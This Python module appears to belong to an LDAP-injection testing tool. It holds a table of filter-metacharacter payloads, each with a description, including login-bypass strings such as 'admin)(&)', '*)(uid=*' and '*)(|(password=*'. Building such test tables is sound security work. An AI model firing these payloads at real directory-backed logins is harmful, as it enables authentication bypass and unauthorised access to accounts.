"""The LDAP filter-metacharacter payload table.

Each entry drives one request. Keeping payloads in a table instead of
one branch of code per payload is what Step 4 of the build plan asks
for: adding a new payload means adding one row here, not new code.

Categories, per the brief: wildcards, parentheses, backslashes, and
null bytes -- in both single and combined forms.
"""

PAYLOADS = [
    {
        "id": "wildcard-basic",
        "category": "wildcard",
        "value": "*",
        "description": "Matches any value -- the classic LDAP filter wildcard.",
    },
    {
        "id": "wildcard-login-bypass",
        "category": "wildcard",
        "value": "*)(uid=*",
        "description": "Closes the current clause early and reopens a new uid clause.",
    },
    {
        "id": "paren-close",
        "category": "parentheses",
        "value": ")",
        "description": "A single unmatched closing parenthesis, to break filter syntax.",
    },
    {
        "id": "paren-or-injection",
        "category": "parentheses",
        "value": "*)(|(password=*",
        "description": "Closes the current clause and ORs in a password match.",
    },
    {
        "id": "paren-admin-bypass",
        "category": "parentheses",
        "value": "admin)(&)",
        "description": "Classic LDAP login-bypass payload targeting an admin account.",
    },
    {
        "id": "backslash-bare",
        "category": "backslash",
        "value": "\\",
        "description": "A bare backslash -- the LDAP escape character itself, unescaped.",
    },
    {
        "id": "backslash-hex-paren",
        "category": "backslash",
        "value": "\\28",
        "description": "A backslash-escaped hex sequence for '(' to probe escaping logic.",
    },
    {
        "id": "nullbyte-basic",
        "category": "nullbyte",
        "value": "\x00",
        "description": "A null byte, which can truncate strings in some backend parsers.",
    },
    {
        "id": "nullbyte-combined",
        "category": "nullbyte",
        "value": "*\x00",
        "description": "Wildcard followed by a null byte -- combines two technique classes.",
    },
    {
        "id": "combined-full-bypass",
        "category": "combined",
        "value": "*)(&(objectClass=*",
        "description": "Combines wildcard and parentheses into an always-true style filter.",
    },
]


def get_payloads():
    """Return a copy of the payload table so callers can't mutate the original."""
    return [dict(p) for p in PAYLOADS]
